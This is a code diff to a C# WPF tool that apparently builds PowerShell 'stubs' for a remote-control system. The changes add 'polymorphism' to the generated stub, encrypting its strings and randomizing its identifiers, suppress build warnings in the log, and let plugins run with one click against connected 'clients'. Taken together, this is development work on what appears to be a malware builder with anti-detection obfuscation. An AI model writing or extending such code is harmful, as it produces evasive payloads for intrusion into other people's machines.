@@ -3320,6 +3320,11 @@ namespace WpfApp
             });
         }
 
+        private void BuilderOutputTextBox_PreviewMouseDown(object sender, MouseButtonEventArgs e)
+        {
+            builderOutputTextBox.Focus();
+        }
+
         private bool ValidateBuilderInputs()
         {
             if (!int.TryParse(builderPortTextBox.Text.Trim(), out int port) || port <= 0 || port > 65535)
@@ -3398,6 +3403,17 @@ namespace WpfApp
             {
                 AppendLog("Silent mode enabled — stripping comments and debug output from PowerShell stub.");
                 content = StripPowerShellDebug(content);
+            }
+
+            AppendLog("Applying PS1 polymorphism: encrypting strings, randomizing identifiers...");
+            try
+            {
+                content = PSStubObfuscator.Obfuscate(content);
+            }
+            catch (Exception ex)
+            {
+                AppendLog("PS1 OBFUSCATION ERROR: " + ex.GetType().Name + ": " + ex.Message);
+                AppendLog("PS1 obfuscation failed — returning unobfuscated stub.");
             }
 
             return content;
@@ -3572,8 +3588,10 @@ namespace WpfApp
                     {
                         if (args.Data != null)
                         {
-                            stdout.AppendLine(args.Data);
                             string line = args.Data;
+                            stdout.AppendLine(line);
+                            if (line.IndexOf("warning", StringComparison.OrdinalIgnoreCase) >= 0)
+                                return;
                             Dispatcher.BeginInvoke(() => {
                                 AppendLog($"  [build] {line}");
                                 if (!string.IsNullOrWhiteSpace(line))
@@ -3586,8 +3604,10 @@ namespace WpfApp
                     {
                         if (args.Data != null)
                         {
-                            stderr.AppendLine(args.Data);
                             string line = args.Data;
+                            stderr.AppendLine(line);
+                            if (line.IndexOf("warning", StringComparison.OrdinalIgnoreCase) >= 0)
+                                return;
                             Dispatcher.BeginInvoke(() => {
                                 AppendLog($"  [build-err] {line}");
                                 if (!string.IsNullOrWhiteSpace(line))
@@ -4100,6 +4120,20 @@ namespace WpfApp
             if (!_pluginHost.LoadedPlugins.TryGetValue(pluginId, out var plugin))
             {
                 AppendLog($"Plugin '{pluginId}' not found in loaded plugins.");
+                return;
+            }
+
+            if (plugin is IOneClickPlugin oneClick)
+            {
+                try
+                {
+                    await oneClick.Execute(context);
+                    AppendLog($"Executed '{plugin.DisplayName}' for client '{clientId}'.");
+                }
+                catch (Exception ex)
+                {
+                    AppendLog($"Failed to execute '{plugin.DisplayName}' for '{clientId}': {ex.Message}");
+                }
                 return;
             }
 
